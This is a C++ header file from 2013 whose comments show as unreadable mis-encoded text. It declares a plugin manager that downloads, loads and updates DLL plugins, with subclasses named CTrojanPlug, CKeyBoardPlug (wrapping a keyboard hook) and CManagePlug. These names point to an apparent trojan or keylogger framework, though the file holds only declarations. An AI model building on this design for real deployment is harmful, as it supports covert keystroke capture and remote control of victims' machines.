/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief ��������࣬ÿ��ʵ������һ�����
* @author ����ΰ chengwei@run.com
* @date 2013-07-30
* @version 1.0
* @note CPlugServerInfo�ǻ��࣬���������ݺ�״̬��������template methodģʽת��������
*		CTrojanPlug,CManagePlug,CKeyBoardPlugΪ���࣬���崦����������Ǵ���
*************************************************************************/

#ifndef __TSP_PLUGININFO_H__
#define __TSP_PLUGININFO_H__

#include "ddc_util.h"
#include "TspPluginIni.hpp"
#include "KeyLogExe.h"
#include "macros.h"

/**
* @class CPlugServerInfo
* 
* @brief ���������Ϣ�Ļ���
*/
class CPlugServerInfo
{
public:
	friend class CPluginServer;

	//���״̬
	enum { STATUS_INIT,					// ���ʼ����dll���Ƶȶ���û��
		STATUS_DELETE,					// �Ѿ�ɾ��
		STATUS_WAITDOWNLOAD,			// δ����
		STATUS_LOAD,					// �Ѿ�����,dll_handle��Ϊ��
		STATUS_UNLOAD,					// �Ѿ�ж��,���߻�δ���أ�dll_handleΪ��
		STATUS_RUNNING,					// ������
		STATUS_STOP,					// ֹͣ��״̬��STATUS_LOAD��ͬ�����ⲿ��Ҫȷ�ϵ��õ����ĸ��������ڲ�����������״̬
		STATUS_ERROR,					// ����
		STATUS_DOWNLOAD,				// ���سɹ�		
	};	

	enum { UPDATE_DLL=1,UPDATE_CFG=2};	// ���²�����UPDATE_DLLΪ֪ͨDllManage����в�����£�UPDATE_CFG����������Ϣ

	/// constrator
	CPlugServerInfo();

	/// destrator
	virtual ~CPlugServerInfo();

	/**
	* ʵ�ּ��ز������
	* @param ��־λ
	* @return �ɹ�����0
	*/	
	int LoadPlug( DWORD dwFlag = 0 );

	/**
	* ʵ��ж�ز������
	* @param ��־λ
	* @return �ɹ�����0
	*/	
	int UnLoadPlug( DWORD dwFlag = 0 );

	/**
	* ʵ�������������	
	* @param ��־λ
	* @return �ɹ�����0
	*/	
	int StartPlug( PLUGPARAM *param = NULL );

	/**
	* ֹͣ��������������߳�	
	* @param ��־λ
	* @return �ɹ�����0
	*/
	int StopPlug( DWORD dwFlag = 0 );  	

	/**
	* ж�ز��	
	* @param ��־λ
	* @return �ɹ�����0
	*/
	int RemovePlug( DWORD dwFlag=0); 

	/**
	* �������
	* @param ��־λ
	* @strConfigFile ��������
	* @param StartPlug()��Ҫ�Ĳ���
	* @return �ɹ�����0
	*/
	int UpdatePlug( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *param = 0 ); 

	/**
	* ���ص������
	* @param strPluginDownLoadPath ���ر����Ŀ¼
	* @return �ɹ�����0
	*/	
	int DownloadPlug( std::string strPluginDownLoadPath );

	/**
	* ���ڱȽϲ������Ƚϲ������
	*/
	bool operator==(const std::string &other){return m_strName==other;};

	/**
	* ��ֵ������
	*/
	CPlugServerInfo& operator=(const CPlugServerInfo &other);

	/**
	* �����ֶ���գ����ֵ
	*/
	void reset(void);

	/**
	* ����״̬
	*/
	void Status(int status) {m_status = status;};

	/**
	* ȡ״̬
	*/
	int GetStatus(void) const{return m_status;};

protected:
	// ����ʵ����������������ӿ���ȫһ������Ҫ�����д
	virtual int LoadPlug_i( DWORD dwFlag = 0 ){return 0;}
	virtual int UnLoadPlug_i( DWORD dwFlag = 0 ){return 0;}
	virtual int StartPlug_i( PLUGPARAM *param = NULL ){return 0;}
	virtual int StopPlug_i( DWORD dwFlag = 0 ){return 0;}
	virtual int RemovePlug_i( DWORD dwFlag=0){return 0;}
	virtual int UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *){return 0;}
	
public:		// ��Ҫ��ȫ�ֺ���ReadPluginIniFile<>���ʣ�ģ�岻֪����ô����Ϊ��Ԫ 

	string m_strName;					/// ������ƣ�����·����Ϣ
	string m_strFullName;				/// �������,��·����Ϣ
	TCHAR m_md5[TSP_PLUGIN_SHORT_PATH];	/// md5
	TCHAR m_ver[TSP_PLUGIN_SHORT_PATH];	/// ver
	string m_strURL;					/// url,�����ڴ�ԭ��ʹ��string��
	DWORD m_dwSize;						/// ��������б���Ҫ
	DWORD m_dwFlag;						/// ��־
	DWORD m_status;						/// ״̬
	DWORD m_pid;						/// ���ݿ��־λ
	string m_strRoot;					/// ϵͳĿ¼��
	string m_strDir;					/// ��Ŀ¼
	string m_strRealName;				/// ʵ���ļ���
	DWORD m_dwReserved;						/// ��������
	char m_szReserved[TSP_PLUGIN_SHORT_PATH];	/// ��������

	HMODULE m_hnd;		/// dll handle,û�ã�handle�Ѿ��� dllmanager�������
};

/**
* @class CTrojanPlug
* 
* @brief ľ����
*/
class CTrojanPlug:public CPlugServerInfo
{
public:
	int UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM * = 0); 
};


/**
* @class CManagePlug
* 
* @brief ��������
*/
class CManagePlug:public CPlugServerInfo
{
public:
	CManagePlug();
	~CManagePlug(){UnLoadPlug(0);};
	int LoadPlug_i( DWORD dwFlag = 0 );
	int UnLoadPlug_i( DWORD dwFlag = 0 );
	int StartPlug_i( PLUGPARAM *param = NULL );
	int StopPlug_i( DWORD dwFlag = 0 );  	
	int RemovePlug_i( DWORD dwFlag=0); 
	int UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *); 
private:
	XShareMemory m_mem;								/// ����dllͨѶ�Ĺ����ڴ�
	DWORD m_dwProcessID;
};

/**
* @class CKeyBoardPlug
* 
* @brief ���̲����
*/
class CKeyBoardPlug:public CPlugServerInfo
{
public:
	CKeyBoardPlug();
	int StartPlug_i( PLUGPARAM *param = NULL );
	int StopPlug_i( DWORD dwFlag = 0 );  	
	int RemovePlug_i( DWORD dwFlag=0); 
	int UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *); 
private:
	// ���̲��
	KeyBoardHook m_KeyBoarkPlugin;
};



#endif	//__TSP_PLUGININFO_H__
